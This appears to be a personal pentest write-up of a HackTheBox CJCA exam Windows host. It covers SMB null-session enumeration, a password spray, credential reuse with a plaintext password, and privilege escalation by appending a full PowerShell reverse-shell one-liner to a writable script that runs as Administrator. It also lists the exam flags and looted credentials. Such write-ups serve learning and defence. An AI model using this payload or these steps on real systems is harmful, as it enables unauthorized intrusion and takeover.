#Status/Exam-Done #Type/Lab #Context/Redteam #Exam/CJCA

---
## Target Information

>[!INFO]- Target Information:
>```
>IP Address: (changed multiple times; not recorded during exam — use nmap at exam start)
>Hostname:   WIN02.luminex.htb (inferred)
>OS:         Windows
>Platform:   HackTheBox CJCA Exam
>```

---
## Timeline

>[!INFO]- Timeline:
>```
>2026-04-25 — Nmap: SMB, RDP, WinRM identified
>2026-04-25 — Null session SMB confirmed; backup user identified
>2026-04-25 — SMB password spray; backup:gmb_ADN6wje9tra3qwf authenticated
>2026-04-25 — Shell as backup via WMI/SMB exec; post-exploitation enumeration
>2026-04-25 — Found MonitorFiles.ps1 — suspected scheduled execution as Administrator
>2026-04-25 — Injected reverse shell into MonitorFiles.ps1; waited for execution
>2026-04-25 — Script executed as Administrator; reverse shell received as root
>```

---
## Enumeration

### Port Scan Results

>[!INFO]- Port Scan Results:
>```
>nmap -oN WIN02-TCP-Ports -T5 -sT -p- -Pn <target-ip>
>
>PORT      STATE SERVICE
>135/tcp   open  msrpc
>139/tcp   open  netbios-ssn
>445/tcp   open  microsoft-ds (SMB)
>3389/tcp  open  ms-wbt-server (RDP)
>47001/tcp open  winrm
>```

### Service Enumeration

>[!INFO]- Service Enumeration:
>```
># SMB null session enumeration
>nxc smb <target-ip> -u '' -p '' --users
>nxc smb <target-ip> -u guest -p '' --shares
># backup user identified via null session; confirmed valid account via SubStatus codes
>```

---
## Foothold

### Vulnerability Identified

>[!INFO]- Vulnerability Identified:
>```
>Credential reuse — backup:gmb_ADN6wje9tra3qwf recovered from /root/log_backup.sh
>on NIX02 post-root. Valid local account on WIN02.
>Approximately 689 NTLM spray attempts before success (automated spray against backup).
>Initial shell obtained via WMI remote execution using the backup credential.
>```

### Exploitation Steps

>[!INFO]- Exploitation Steps:
>```
># 1. Confirm backup credential over SMB
>nxc smb <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf'
>
># 2. Remote command execution as backup via SMB/WMI
>nxc smb <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf' -x whoami
>
># 3. Get interactive shell (WinRM or evil-winrm if port 47001 accessible)
>evil-winrm -i <target-ip> -u backup -p 'gmb_ADN6wje9tra3qwf'
>```

---
## Privilege Escalation

### Vector Identified

>[!INFO]- Vector Identified:
>```
>MonitorFiles.ps1 — a PowerShell script that executes on a schedule under the
>Administrator account. The script was found in a user-accessible location and
>was writable by the backup user. The exact execution mechanism (scheduled task,
>service, or WMI subscription) was unclear during the exam.
>
>Injecting arbitrary commands into the script causes them to run as Administrator
>when the script next fires.
>```

### Steps Taken

>[!INFO]- Steps Taken:
>```
># 1. Locate MonitorFiles.ps1 via manual enumeration or winPEAS
># Typically found in C:\Users\Administrator\, C:\Scripts\, or similar
>
># 2. Inspect the script to understand its structure
>type MonitorFiles.ps1
>
># 3. Append reverse shell to the script
>Add-Content -Path MonitorFiles.ps1 -Value '$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>
># 4. Start listener
>nc -lvnp <port>
>
># 5. Wait for MonitorFiles.ps1 to execute as Administrator
># Result: reverse shell as Administrator (root)
>```

---
## Flags

>[!INFO]- Flags:
>```
>User (backup):        577561d76f5d502daeabb2162118c725
>Root (Administrator): 73842c0719e9207da6b9f7ee6e435ab5
>```

---
## Loot

>[!INFO]- Loot:
>```
>backup:gmb_ADN6wje9tra3qwf     — local user, SMB/WinRM access
>Administrator password changed to wF&Z226m9Y^g#NDWJT via MonitorFiles.ps1 injection
>```

---
## Rabbit Holes

>[!INFO]- Rabbit Holes:
>```
>- Could not determine how MonitorFiles.ps1 was being executed (scheduled task?
>  service? WMI subscription?). Spent time trying to enumerate the trigger before
>  deciding the script looked important enough to inject into and wait.
>  Lesson: if a script runs as a privileged user and is writable — inject and wait.
>  Do not need to understand the exact trigger mechanism to exploit it.
>
>- Did not find backup credentials on NIX02 before moving here. Had to backtrack to
>  NIX02 to find them in /root/log_backup.sh.
>```

---
## Lessons Learned

>[!INFO]- Lessons Learned:
>```
>- When you find a script that appears to run with elevated privileges, check if it is
>  writable — injection + patience beats fully understanding the execution chain.
>- Read ALL of winPEAS/linpeas output. Scheduled tasks, writable scripts, and
>  misconfigured services are consistently present but easy to miss on first pass.
>- Always check /root/ on every rooted Linux host for scripts containing credentials
>  before pivoting to the next target.
>- Note to self: improve in-exam note-taking. Not recording WIN02 IP address meant
>  having to re-scan after resets instead of checking notes.
>```

---
## Related Concepts
- [[Windows Fundamentals]]
- [[Windows Remote Management]]
- [[SMB]]
- [[Windows PowerShell]]

## Related Playbooks
- [[Windows Pentest Playbook]]

## Related Tools
- [[NetExec]]
- [[evil-winrm]]
- [[PEASS-ng]]
- [[xfreerdp]]
- [[Nmap]]

---
## References / Images
- [[Assets/Images/CJCA/CJCA-WIN02-ssh-access-1.png|Initial SSH/Remote Access as backup]]
- [[Assets/Images/CJCA/CJCA-WIN02-user-flag-1.png|User Flag]]
- [[Assets/Images/CJCA/CJCA-WIN02-wondershare-blue-team-1.png|Wondershare Blue Team Alert]]
- [[Assets/Images/CJCA/CJCA-WIN02-leaked-creds-1.png|backup Credentials Found]]
- [[Assets/Images/CJCA/CJCA-WIN02-root-flag-1.png|Root Flag]]
- [[Assets/Images/CJCA/CJCA-WIN02-revshell-1.png|Reverse Shell as Administrator]]
- [[Assets/Images/CJCA/CJCA-WIN02-monitorfiles-injection-1.png|MonitorFiles.ps1 Injection]]
